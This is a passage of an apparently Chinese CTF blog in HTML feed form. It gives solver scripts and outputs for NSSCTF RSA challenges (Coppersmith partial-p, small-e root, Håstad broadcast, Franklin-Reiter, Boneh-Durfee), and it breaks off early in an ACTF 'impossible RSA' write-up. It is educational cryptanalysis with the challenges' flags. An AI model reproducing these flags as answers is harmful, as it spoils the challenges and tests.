class="line"></span><br><span class="line"><span class="selector-attr">[-]</span>long_to_bytes(m)<span class="selector-class">.encode</span>(<span class="string">&#x27;hex&#x27;</span>)=</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>e53534354467b63653832653937626262333535616338353030303563306234336335306232357d</span><br><span class="line">challenge2 completed</span><br></pre></td></tr></table></figure></li></ul>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="attribute">import</span> libnum, gmpy<span class="number">2</span></span><br><span class="line"><span class="attribute">c</span> = <span class="number">11137144779427596512325170685147473562579382171362503478475347640064577221517156636753228911996179961656510854973657786717656831471849897729940758053634217813748772532744785202527028799463823823951772911580724026290152964384253894559215344542770992252528792774895912147793520115570149507132169954672432261296536921008916861400631531765187550047503023916993544848424696991248835704817941853830044856268328430457918271247908784305049525074525029765749136180181560277025886732703297510912964179476813614319822496848845364727714491057767489809429555415276322397248388069790294482714516847353457868720649928392324385783659</span></span><br><span class="line"><span class="attribute">n</span> = <span class="number">20830947925132665202608201476543152873707285891221124190904503664462033960785788367156025547382844076879484108425075427999117558274080485370433894095168224986681460752870638969251201797984438385751454853811849334656135699018814782166761946734037568555000233999876021096147306660374648595995387615158849254147278615137349869283097560770056763007765458447973952497550521101298016814755832737137678555795393691003900822094504217885765408832692854710255311214322215461040107114896262753620554174647040295543768855026488354367051909095849614827812242316337627929542206753163951992499102075017588133211511519442589868399209</span></span><br><span class="line"><span class="attribute">e</span> = <span class="number">65537</span></span><br><span class="line"><span class="attribute">kbit</span> = <span class="number">128</span></span><br><span class="line"><span class="attribute">p0</span> = <span class="number">118940119210016317990045155801100877489358068423123091575907183556540755690934705051716625103536230858583816920450205621200746207520769560428951671838067737785302213169572869149358081263673577776906772000439883491594209298392583037331881591354747527243747594112438728757721325095719043772720836197132036734976</span></span><br><span class="line"><span class="attribute">PR</span>.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="attribute">f</span> = p<span class="number">0</span>+x</span><br><span class="line"><span class="attribute">x</span> = f.small_roots(X=<span class="number">2</span>^kbit, beta=<span class="number">0</span>.<span class="number">4</span>)</span><br><span class="line"><span class="comment"># [1543502407706049247756460709245532058042364294454474880044105, 420644368256035122521364007269668769246032840480767531547935]</span></span><br><span class="line"><span class="attribute">p</span> = p<span class="number">0</span>+int(x[<span class="number">0</span>])</span><br><span class="line"><span class="attribute">q</span> = n // p</span><br><span class="line"><span class="attribute">d</span> = int(gmpy<span class="number">2</span>.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br><span class="line"><span class="attribute">m</span> = int(pow(c, d, n))</span><br><span class="line"><span class="attribute">print</span>(libnum.n<span class="number">2</span>s(m).hex())</span><br></pre></td></tr></table></figure><ul><li><p>给了d低位，但跑不出来，用低e攻击秒出</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[+]</span>Generating challenge <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>n=<span class="number">89773856865647532789133848688372646776565366548252598781217905632498934212599593153200577780255807845681796915152934480943076563244617360693170810625153463474211910134539180021228359564467810301969996364868063052147561336853528490258438355476747407405146293273491444021091430384405451231994292618908534380557</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>e=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>m=random<span class="selector-class">.getrandbits</span>(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>c=pow(m,e,n)=<span class="number">279116358436840586974709590248388946576516187502518179576988811874767402972588315731516153520734651957821612329831372799017402780741995987375258636667865079100987795289407232620878830630802280166734640423706695819192808948526182697434731647473235541700077832678666281560894630034271897701</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>d&amp;((<span class="number">1</span>&lt;&lt;<span class="number">512</span>)-<span class="number">1</span>)=<span class="number">49802280372024724635830244988989932315803129085391269518611260496201496486820364910639967526858055384357625463893876156338160967361580798877826917845419</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[-]</span>long_to_bytes(m)<span class="selector-class">.encode</span>(<span class="string">&#x27;hex&#x27;</span>)=</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>e53534354467b61663735633934373838343032666637646236383865613739623062383562617d</span><br><span class="line">challenge3 completed</span><br></pre></td></tr></table></figure></li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="comment"># m越长越不利于爆破出结果</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">a,b = gmpy2.iroot(mm, e)</span></span><br><span class="line"><span class="string">a 为 mm开e次方的结果，b为是否刚好开得出来（True/False）</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span>(<span class="params">c, e, n</span>):</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        mm = c + n*k</span><br><span class="line">        result, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">n=<span class="number">91046679824709970162166510393984349436507160355504054099795745710843918232291158893173392345202539943129024459721861867023537200311589378076393008186869632816007290025155710690087286079985123881126900629981074014645167000252730113633981429235819837855381591602381430468841314334641325933457672374936644601001</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">c=<span class="number">279116358436840580418940102891469361711985570618086638410015681467792988932869992663175128601830997392899009434533165482291158081783499352092021651217760633821487767077178436162836170197174297227386919476479085259086862455979023948465984342333447127816627669958590898325507691223787985253</span></span><br><span class="line">m=de(c,e,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><ul><li><p>低加密指数广播攻击</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge 4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">e</span>=3</span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">m</span>=random.getrandbits(512)</span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">n1</span>=124563768792509416008021985841989981753081792478825800792286148435153131654283140323871125343656088446362263151697679035960009773023601459103303176772978649138999131316408093332655524416277152851939729963632286727238149879320579508735328790324506013446484343697799236052707784724755318248649291652344571831589</span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">c1</span>=pow(m,e,n1)=279116358436840587566517694780928913487931485947614234823704404472617434263815671470444622266041047403738401080570039104060390493635635368662340875816838891757569305641456773339288967618075926659958357128374510362586125506882728421087631651655548042939805790783968753171259731111234177125</span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">n2</span>=84561797704957266384491892654217513080694101006520363876005508497555421491740438708265907215897849175263004958278087751419225733590045477508001930670477095753833707256639507434950981063366889326293773824286487630076834730686515093065667286594656088214885435486297779174231374502701401724440519010791267672247</span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">c2</span>=pow(m,e,n2)=279116358436840587566517694780928913487931485947614234823704404472617434263815671470444622266041047403738401080570039104060390493635635368662340875816838891757569305641456773339288967618075926659958357128374510362586125506882728421087631651655548042939805790783968753171259731111234177125</span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">n3</span>=68490468751767969355094121227532448791974100305463186385862867801481483238694557331841003069191634601446560572940776531299769320776951684806416392460319020564810717065235353421959188531834413019658113978451922955896227028787460869516167582878879171620869415099300899129116470300679216567233807270409324443567</span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">c3</span>=pow(m,e,n3)=279116358436840587566517694780928913487931485947614234823704404472617434263815671470444622266041047403738401080570039104060390493635635368662340875816838891757569305641456773339288967618075926659958357128374510362586125506882728421087631651655548042939805790783968753171259731111234177125</span><br><span class="line"></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">&#x27;hex&#x27;</span>)=</span><br><span class="line"></span><br><span class="line">4e53534354467b65636238363236376433663162623736363732373431646635353930613463617d</span><br><span class="line">challenge4 completed</span><br></pre></td></tr></table></figure></li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span>(<span class="params">ai, mi</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (reduce(gmpy2.gcd, mi) == <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M // m) * gmpy2.invert(M // m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = [<span class="number">108736816241175665148273398258758080018960946338287263364569374726302196169162605670881735552997454446042995869651449282714639817085183228827146377987324938368188209657339192168670905752630070180008635819292194863047273313500409087217920196986541427006384815578060250088479783691454217221007011624615314023899</span>, <span class="number">125311072436452106223310243651666447263593613934983230425360328449529562394786242626857578081604150972806837244925660405048300400604492591126681020111390674731777377449723245786875368033901438466732844507365503701957616443294592677795315630591380298492356628165441987010153245453234081489921029340196899395331</span>,</span><br><span class="line">     <span class="number">145952553475400806121889743433836062205241126114628994131042124255411306520718902459725859533701853065633604102288257122762822143440371454643188884668825711330843803637043792113112949317335498541040720711359198080384919545170988381565195230298044019615673547840211274883413248354873966128295173063309521168793</span>]</span><br><span class="line">c = [<span class="number">279116358436840587095249496686254280407332053342087519248181392057376438009454609418875798499072335086788124425593780862179185140902876002463710935769268790619149829113441912759030007987894680912774697528843208252759906296795513540716051082272447068540992498830366255300897173712420417125</span>, <span class="number">279116358436840587095249496686254280407332053342087519248181392057376438009454609418875798499072335086788124425593780862179185140902876002463710935769268790619149829113441912759030007987894680912774697528843208252759906296795513540716051082272447068540992498830366255300897173712420417125</span>,</span><br><span class="line">     <span class="number">279116358436840587095249496686254280407332053342087519248181392057376438009454609418875798499072335086788124425593780862179185140902876002463710935769268790619149829113441912759030007987894680912774697528843208252759906296795513540716051082272447068540992498830366255300897173712420417125</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#  五进制转十进制</span></span><br><span class="line"><span class="string">n1 = []</span></span><br><span class="line"><span class="string">c1 = []</span></span><br><span class="line"><span class="string">for each in n:</span></span><br><span class="line"><span class="string">    n1.append(int(str(each), 5))</span></span><br><span class="line"><span class="string">for each in c:</span></span><br><span class="line"><span class="string">    c1.append(int(str(each), 5))</span></span><br><span class="line"><span class="string">n = n1</span></span><br><span class="line"><span class="string">c = c1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用中国剩余定理求解</span></span><br><span class="line">m = gmpy2.iroot(CRT(c, n), e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><ul><li><p>明文线性相关</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">n</span>=21429425398210967707909628859942973537224436647532980230726493099305742824766270853929975972690303041909526001733991446303871137522439503328925032466304256374647359518452449746921513559066080682460078094776752212082321993409045104876731233286545426838926300103834290157528384506385481519688666000782856609900851612966748184414791450182758413018973605263391254135754688148513923482024316942640211588559652059925484962822975577587275910085801634523858135106240262529639244908508123451583901185630426915824725575396390698386609888739848106462455208373547256248127515773962595744124798303915247122445176133387866920105233</span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">e</span>=7</span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">m</span>=random.getrandbits(512)</span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">c</span>=pow(m,e,n)=3913355162506843667079312859018190210750453812024216931887013212736340446942162694100894791135119403317486675866999568493278124809272327516322633309413823913596448870616331557266099673907258759210921465394812506017015841046660045982292478544487202676877585076443587857982785230839097210888481000514300634948079175019815712503927918346384686657080274822468346123329902364959230990767464857544305639690661300813431789147490002490485680400671384441342427462071211423204456959983657856469034361843518906932742755839477892090867737525818438595032896123389082695556216022212240001190090281258165331416657932822805874602168</span><br><span class="line"></span><br><span class="line">[+]<span class="attribute">x</span>=pow(m+1,e,n)=3913355162506843667079312859018190210750999153615046231990422792509829450409212168507688057410976245834264140419108113476107790991506117144211120541710779587327967147999832294267428915095580485615923712261506555190257352674496596197869320069747269797902622599010051829852374293544522141824192458083264555499712388195731657971351737292981358503624428934337287306553109606196697224316949028722924520843757990451867544386438405893429648867504042574932635621879182744390170108609387296218948392041657682468255953226052675102710060363708081291924114406497165841292907447536561975232950061358289722917586138566490502779459</span><br><span class="line"></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">&#x27;hex&#x27;</span>)=</span><br><span class="line"></span><br><span class="line">4e53534354467b66373736396634343634313131323264393431613034303630663635643966617d</span><br><span class="line">challenge5 completed</span><br></pre></td></tr></table></figure></li></ul>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本1</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="attribute">import</span> libnum</span><br><span class="line"><span class="attribute">def</span> attack(c<span class="number">1</span>, c<span class="number">2</span>, n, e):</span><br><span class="line">    <span class="attribute">PR</span>.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="comment"># replace a,b,c,d</span></span><br><span class="line">    <span class="attribute">g1</span> = (x)^e - c<span class="number">1</span></span><br><span class="line">    <span class="attribute">g2</span> = (x+<span class="number">1</span>)^e - c<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">def</span> gcd(g<span class="number">1</span>, g<span class="number">2</span>):</span><br><span class="line">        <span class="attribute">while</span> g<span class="number">2</span>:</span><br><span class="line">            <span class="attribute">g1</span>, g<span class="number">2</span> = g<span class="number">2</span>, g<span class="number">1</span> % g<span class="number">2</span></span><br><span class="line">        <span class="attribute">return</span> g<span class="number">1</span>.monic()</span><br><span class="line">    <span class="attribute">return</span> -gcd(g<span class="number">1</span>, g<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="attribute">c1</span> = <span class="number">7418469310902085437902845069810907325748187977112113013220980112424442407226613760137761252552648007440383331950784228115986488475925283144593824500894571405880353340364207514694865844222508784001099834491784492065366210845193614581254153562661925385483663311199429650248093515309902747077140513942599407673983337470272240847775515213386498877652829223938536140405276402077587122957982174528164436480795702083875459915633643501521880665049597701799478311622533919864653221378168651815325375699506672607343438523384457249220358586701209073706415789620321939705636356508188823859264169488961318134313316063366665910206</span></span><br><span class="line"><span class="attribute">c2</span> = <span class="number">7418469310902085437902845069810907325748733318702942313324389630211155769858788619682593335606609874466071236380121906106667783380907883818266786633397419722492444714853781910785481012125683973018650974770499567295703842779905172289953314716678797071300101083018194616487898334829834287716319231206235032949259157514750919737173561247151807407433293665350985762009700294101008050532709741770671530046518254092265430246868161574567969187502303931582046841847862821179049361509293491493411427903204699783947564964113915141948898374580142274167217290438324911526116560240686491037292687977366065861177410333052288211017</span></span><br><span class="line"><span class="attribute">n</span> = <span class="number">15369301775722059379429609723694490645255566936766905366291805492170763202593417656003920322518507848926288093010156491021125903284959504824779141231360967938816670520213388416181376350025270847161283019625359588420327428720596770506411481513335537892798306797489759059676798449378078117722107191381693669966064104766048590386108378235589500841522523925342214114615411024645758263462037005808907358130815114751124039909396193753673415118331184548463083765708917853412605088824688043832076082343772226366300855419378276186462741799922089994387916401407026411238770214496917807205333955808483034512681150324952200389371</span></span><br><span class="line"><span class="attribute">e</span> = <span class="number">7</span></span><br><span class="line"><span class="attribute">m1</span> = attack(c<span class="number">1</span>, c<span class="number">2</span>, n, e)</span><br><span class="line"><span class="attribute">print</span>(libnum.n<span class="number">2</span>s(int(m<span class="number">1</span>)).hex())</span><br></pre></td></tr></table></figure><ul><li><p>大e，Boneh Durfee攻击</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[+]</span>Generating challenge <span class="number">6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>n=<span class="number">28433765123193272413937762328478900250760726527540970528301125490692394193031349424192977308025178980197573233532541331581039212649482368461209698222920253798119078082671456554327106356072755216440255350551249872704198183911243201154461425078130834820720266808857878403255335514633434963386337641056957575165904599192527874783819857605968879265626890622973853987796385119695123510693355367524397097570051202427674198944461737328738571947837456929308212464789234856571770942917129100514149090445032962309425666609028922888756077436344010090550110050333505553564704195272515880559514315921553383277840399836719879267731</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>d=random<span class="selector-class">.getrandbits</span>(<span class="number">1024</span>*<span class="number">0.270</span>)</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>e=invmod(d,phin)</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>hex(e)=<span class="number">811064441382390422335857185171964973819180142301034110312988812579005103329415811219397407236358334135487556791344847049720438309636553312944761097650405633450388819857262840347127104523831328363719063788724868945425984301234811155086117303272342049043287977725138042272369408683842806781452249258950318980189467107669120017021224184673163673234831941754189977759548338864842058620085924302835065610153298473720275399826055185583261279983714863993762808707903048297439473962219973732254616170084914227048491750377156055199702452409838475535269005815857545489975713790116627357389141915361080713898345310344819398011</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>m=random<span class="selector-class">.getrandbits</span>(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span>c=pow(m,e,n)=<span class="number">2215549666936383194009635202892010085709856759041385283571550251738688341878837204412349600843761936463943527306046381600377509428569282671471506183509982449074173134639828628105390619414363248600509852727320877722437239205741142553919197277254271177715138457833445878021907118662246369477491944116273889264876060672674938035936224599859202705638000108999326600486767306332492774808128640611101750088219310107966545884546610768651618457937614209194972795161283251661411131762647432150736155121251925910033554158554435962239917000949778234952957874313580236210225985749573493184918938295299027272872552712367286649836</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[-]</span>long_to_bytes(m)<span class="selector-class">.encode</span>(<span class="string">&#x27;hex&#x27;</span>)=</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>e53534354467b35336232333561643933383663343862633564316639333961663233306130357d</span><br><span class="line">challenge6 completed</span><br><span class="line"></span><br><span class="line">NSSCTF&#123;<span class="number">43</span>de032b-<span class="number">1431</span>-<span class="number">4082</span>-a701-a198cc3dbe8e&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Boneh Durfee代码已分享过，此处略</span></span><br><span class="line"><span class="comment"># 但需要注意NSSCTF复现的有些问题，偶尔会分不出d，需要重开 ：  （</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">d = <span class="number">5415090862251732317442024436621547096348588561944422740935945311625453350444967843</span></span><br><span class="line">n=<span class="number">28433765123193272413937762328478900250760726527540970528301125490692394193031349424192977308025178980197573233532541331581039212649482368461209698222920253798119078082671456554327106356072755216440255350551249872704198183911243201154461425078130834820720266808857878403255335514633434963386337641056957575165904599192527874783819857605968879265626890622973853987796385119695123510693355367524397097570051202427674198944461737328738571947837456929308212464789234856571770942917129100514149090445032962309425666609028922888756077436344010090550110050333505553564704195272515880559514315921553383277840399836719879267731</span></span><br><span class="line">e=<span class="number">0x811064441382390422335857185171964973819180142301034110312988812579005103329415811219397407236358334135487556791344847049720438309636553312944761097650405633450388819857262840347127104523831328363719063788724868945425984301234811155086117303272342049043287977725138042272369408683842806781452249258950318980189467107669120017021224184673163673234831941754189977759548338864842058620085924302835065610153298473720275399826055185583261279983714863993762808707903048297439473962219973732254616170084914227048491750377156055199702452409838475535269005815857545489975713790116627357389141915361080713898345310344819398011</span></span><br><span class="line">c=<span class="number">2215549666936383194009635202892010085709856759041385283571550251738688341878837204412349600843761936463943527306046381600377509428569282671471506183509982449074173134639828628105390619414363248600509852727320877722437239205741142553919197277254271177715138457833445878021907118662246369477491944116273889264876060672674938035936224599859202705638000108999326600486767306332492774808128640611101750088219310107966545884546610768651618457937614209194972795161283251661411131762647432150736155121251925910033554158554435962239917000949778234952957874313580236210225985749573493184918938295299027272872552712367286649836</span></span><br><span class="line">m=<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022ACTF·密码复现</title>
      <link href="/2022/07/04/2022ACTF%E5%AF%86%E7%A0%81%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/07/04/2022ACTF%E5%AF%86%E7%A0%81%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跟最后一门高数考试撞了，考完后全力打了半天，没出</p><h1 id="impossible-RSA"><a href="#impossible-RSA" class="headerlink" title="impossible RSA"></a>impossible RSA</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li>server.py</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">flag = <span class="string">b&#x27;ACTF&#123;...&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = inverse(e, p)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isPrime(q):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    n = p * q</span><br><span class="line">    public = RSA.construct((n, e))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;public.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(public.exportKey(<span class="string">&#x27;PEM&#x27;</span>))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(long_to_bytes(<span class="built_in">pow</span>(bytes_to_long(flag), e, n)))</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><ul><li>public.pem</li><li>flag</li></ul><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>25号在预习高数，简单看了下题目，观察到$q = inv(e, p)$,以为考察的是$e=inv(q, p)$,便就放那了</p><p>26号考完时，Mu_chen师傅已经出了（师傅🐮），便也没再花时间在这题上</p><p>赛后发现我的思路是错的，题还是做少了，没有题感</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span 